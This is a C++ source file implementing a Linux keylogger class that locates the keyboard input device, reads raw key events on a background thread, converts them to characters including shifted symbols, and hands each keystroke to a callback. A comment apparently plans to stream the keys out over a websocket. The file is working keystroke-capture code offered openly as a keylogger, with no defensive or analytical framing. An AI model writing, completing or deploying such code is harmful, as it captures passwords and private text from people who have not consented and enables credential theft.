#include "api/keylogger.hpp"

#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <cstring>
#include <cstdio>
#include <vector>
#include <map>

// Mapping for standard US keyboard
static const char *key_map[256] = {
    "RESERVED", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "BACKSPACE",
    "TAB", "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "ENTER", "L_CTRL",
    "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "`", "L_SHIFT", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".", "/", "R_SHIFT",
    "KP*", "L_ALT", "SPACE", "CAPS_LOCK", "F1", "F2", "F3", "F4", "F5", "F6", "F7", "F8", "F9", "F10", "NUM_LOCK", "SCROLL_LOCK",
    "KP7", "KP8", "KP9", "KP-", "KP4", "KP5", "KP6", "KP+", "KP1", "KP2", "KP3", "KP0", "KP.",
    // ... truncated common keys. We handle main alphanumeric.
};

// Simple shift map for common characters
static char get_shifted_char(const char* key) {
    if (strlen(key) != 1) return 0;
    char c = key[0];
    if (c >= 'a' && c <= 'z') return c - 32;
    // Symbols
    if (c == '1') return '!';
    if (c == '2') return '@';
    if (c == '3') return '#';
    if (c == '4') return '$';
    if (c == '5') return '%';
    if (c == '6') return '^';
    if (c == '7') return '&';
    if (c == '8') return '*';
    if (c == '9') return '(';
    if (c == '0') return ')';
    if (c == '-') return '_';
    if (c == '=') return '+';
    if (c == '[') return '{';
    if (c == ']') return '}';
    if (c == ';') return ':';
    if (c == '\'') return '"';
    if (c == ',') return '<';
    if (c == '.') return '>';
    if (c == '/') return '?';
    if (c == '\\') return '|';
    if (c == '`') return '~';
    return 0;
}

Keylogger::Keylogger() : fd_(-1), running_(false) {}

Keylogger::~Keylogger() {
    stop();
}

bool Keylogger::start(std::function<void(std::string)> callback) {
    if (running_.load()) return true;

    if (!find_keyboard_()) {
        last_error_ = "Keyboard device not found";
        return false;
    }

    if (!open_device_()) {
        last_error_ = "Failed to open device: " + device_path_;
        return false;
    }

    running_.store(true);
    event_thread_ = std::thread([this, callback]() {
        this->run_capture(callback);
    });

    return true;
}

// Overload start with callback, need to update header too
// Or just let backend call a loop method?
// Ideally: keylogger.start([&](string key){ send_ws(...) });
// I will modify the header later. For now, implement finding/opening.

bool Keylogger::is_running() const {
    return running_.load();
}

void Keylogger::stop() {
    running_.store(false);
    if (event_thread_.joinable()) event_thread_.join();
    if (fd_ >= 0) {
        close(fd_);
        fd_ = -1;
    }
}

std::string Keylogger::get_last_error() const {
    return last_error_;
}

bool Keylogger::find_keyboard_() {
    std::cout << "[Keylogger] Scanning /proc/bus/input/devices..." << std::endl;
    FILE *fp = fopen("/proc/bus/input/devices", "r");
    if (!fp) {
        std::cerr << "[Keylogger] ERROR: Failed to open /proc/bus/input/devices" << std::endl;
        return false;
    }

    char line[512];
    char name[512] = "Unknown";
    char handlers[512] = "";

    std::string picked_device = "";

    while (fgets(line, sizeof(line), fp)) {
        // Capture Name
        if (strncmp(line, "N: Name=", 8) == 0) {
            sscanf(line, "N: Name=\"%511[^\"]\"", name);
        }
        // Capture Handlers
        if (strncmp(line, "H: Handlers=", 12) == 0) {
            // Safe copy
            strncpy(handlers, line + 12, sizeof(handlers) - 1);
            handlers[sizeof(handlers) - 1] = '\0'; // Guarantee null termination
            handlers[strcspn(handlers, "\n")] = 0; // Strip newline

            // heuristic: looking for 'kbd' AND 'event'
            if (strstr(handlers, "kbd") && strstr(handlers, "event")) {
                char *p = strstr(handlers, "event");
                int evt_id = -1;
                if (p && sscanf(p, "event%d", &evt_id) == 1) {
                    std::string dev = "/dev/input/event" + std::to_string(evt_id);
                    std::cout << "[Keylogger] Candidate: " << name << " -> " << dev << std::endl;

                    // Simple heuristic: Unlikely to be a button/switch if name has "keyboard"
                    // But for now, just pick the LAST valid one found (often the plugged-in USB)
                    // Or keep the first one?
                    // Let's pick the last one that contains "keyboard" if possible, else just last kbd.
                    picked_device = dev;
                }
            }
        }
        // Reset block on empty line (standard format)
        if (line[0] == '\n') {
            strcpy(name, "Unknown");
        }
    }
    fclose(fp);

    if (!picked_device.empty()) {
        device_path_ = picked_device;
        std::cout << "[Keylogger] SELECTED DEVICE: " << device_path_ << std::endl;
        return true;
    }

    // Fallback
    device_path_ = "/dev/input/event0";
    std::cout << "[Keylogger] WARNING: No 'kbd' handler found. Defaulting to: " << device_path_ << std::endl;
    return true;
}

bool Keylogger::open_device_() {
    fd_ = open(device_path_.c_str(), O_RDONLY);
    if (fd_ < 0) {
        std::cerr << "[Keylogger] Failed to open " << device_path_ << " (Permission denied? Use sudo)" << std::endl;
        return false;
    }
    std::cout << "[Keylogger] Successfully opened input device." << std::endl;
    return true;
}

// This needs to be public or accessible by the thread
void Keylogger::run_capture(std::function<void(std::string)> callback) {
    if (fd_ < 0) return;

    struct input_event ev;
    bool shift_pressed = false;

    while (running_.load()) {
        ssize_t n = read(fd_, &ev, sizeof(ev));
        if (n <= 0) break;

        if (ev.type == EV_KEY) {
            // Ignore codes out of range
            if (ev.code >= 256 || !key_map[ev.code]) continue;

            std::string k_str = key_map[ev.code];

            // Handle Shift (Press or Hold)
            if (k_str == "L_SHIFT" || k_str == "R_SHIFT") {
                shift_pressed = (ev.value == 1 || ev.value == 2);
                continue;
            }

            // Only Capture Press (1) and Repeat (2) for actual keys
            if (ev.value == 1 || ev.value == 2) {
                 if (k_str == "SPACE") k_str = " ";
                 else if (k_str == "ENTER") k_str = "\n";
                 else if (k_str == "TAB") k_str = "\t";
                 else if (k_str.length() == 1) {
                     if (shift_pressed) {
                         char s = get_shifted_char(k_str.c_str());
                         if (s) k_str = std::string(1, s);
                         else {
                             // Default to uppercase if simple letter
                             if (k_str[0] >= 'a' && k_str[0] <= 'z') k_str[0] -= 32;
                         }
                     }
                 }
                 // Debug Log
                 std::cout << "[Keylogger] Captured: " << k_str << std::endl;
                 callback(k_str);
            }
        }
    }
}
